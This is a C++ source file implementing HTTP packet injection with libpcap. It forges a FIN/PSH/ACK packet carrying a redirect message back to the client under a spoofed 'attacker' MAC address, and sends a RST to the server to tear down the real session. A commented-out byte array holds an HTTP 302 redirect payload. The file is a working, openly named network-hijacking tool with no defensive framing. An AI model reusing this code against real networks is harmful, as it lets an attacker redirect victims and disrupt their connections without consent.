#include "http_injection.h"
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <iostream>
#include <pcap.h>
#include "mac.h"
#include "calchecksum.h"
/*const u_char redirection[57] = {
    0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x30,0x20,0x33,
    0x30,0x32,0x20,0x52,0x65,0x64,0x69,0x72,0x65,0x63,
    0x74,0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,
    0x6e,0x3a,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,
    0x77,0x61,0x72,0x6e,0x69,0x6e,0x67,0x2e,0x6f,0x72,
    0x2e,0x6b,0x72,0x0d,0x0a,0x0d,0x0a
};*/

bool http_injection(pcap_t *fp, const u_char *pkt_data,int pkt_length, u_char *attacker_mac,char *rd_msg,int rd_length)
{
    struct ether_header *eh,*ceh;
    struct ip *iph,*ciph;
    struct tcphdr *tcph,*ctcph;

    u_char *copy_data = new u_char[1700];
    memset(copy_data,0,1700);
    memcpy(copy_data,pkt_data,pkt_length);

    //Setting FIN packet

    eh = (struct ether_header*)pkt_data;
    ceh = (struct ether_header*)copy_data;

    memcpy(ceh->ether_dhost,eh->ether_shost,ETH_ALEN);
    memcpy(ceh->ether_shost,attacker_mac,ETH_ALEN);

    pkt_data += sizeof(struct ether_header);
    copy_data += sizeof(struct ether_header);
    pkt_length -= sizeof(struct ether_header);

    iph = (struct ip*)pkt_data;
    ciph = (struct ip*)copy_data;
    tcph = (struct tcphdr*)(pkt_data+iph->ip_hl*4);
    ctcph = (struct tcphdr*)(copy_data+ciph->ip_hl*4);

    ctcph->th_off = 5;

    ciph->ip_dst = iph->ip_src;
    ciph->ip_src = iph->ip_dst;
    ciph->ip_len = htons(ciph->ip_hl*4+ctcph->doff*4+rd_length);
    calIPChecksum((uint8_t*)ciph);

    ctcph->th_flags = 0x19;
    ctcph->th_seq = tcph->th_ack;
    ctcph->th_ack = htonl(ntohl(tcph->seq)+(pkt_length-(iph->ip_hl*4+tcph->doff*4)));
    ctcph->th_dport = tcph->th_sport;
    ctcph->th_sport = tcph->th_dport;
    memcpy(copy_data+ciph->ip_hl*4+ctcph->doff*4,rd_msg,rd_length);
    ctcph->th_sum = calTCPChecksum(copy_data,ciph->ip_hl*4+ctcph->doff*4+rd_length);

    int jump_pointer = sizeof(struct ether_header)+ciph->ip_hl*4+ctcph->doff*4;

    pkt_data -= sizeof(struct ether_header);
    copy_data -= sizeof(struct ether_header);
    pkt_length += sizeof(struct ether_header);
    if(pcap_sendpacket(fp,copy_data,jump_pointer+rd_length))
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        return false;
    }
    //Setting RST packet
    eh = (struct ether_header*)pkt_data;
    memcpy(eh->ether_shost,attacker_mac,ETH_ALEN);
    pkt_data += sizeof(struct ether_header);
    pkt_length -= sizeof(struct ether_header);

    iph = (struct ip*)pkt_data;
    tcph = (struct tcphdr*)(pkt_data+iph->ip_hl*4);

    tcph->seq = htonl(ntohl(tcph->seq)+pkt_length-40);
    tcph->th_off = 5;

    iph->ip_len = htons(iph->ip_hl*4+tcph->doff*4);
    calIPChecksum((uint8_t*)iph);
    jump_pointer = sizeof(struct ether_header)+iph->ip_hl*4+tcph->doff*4;

    tcph->th_flags = 0x14;
    tcph->th_sum = calTCPChecksum((u_char*)pkt_data,40);

    pkt_data -= sizeof(struct ether_header);
    pkt_length += sizeof(struct ether_header);
    delete(copy_data);

    if(pcap_sendpacket(fp,pkt_data,jump_pointer))
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        return false;
    }
    else
    {
        return true;
    }
}
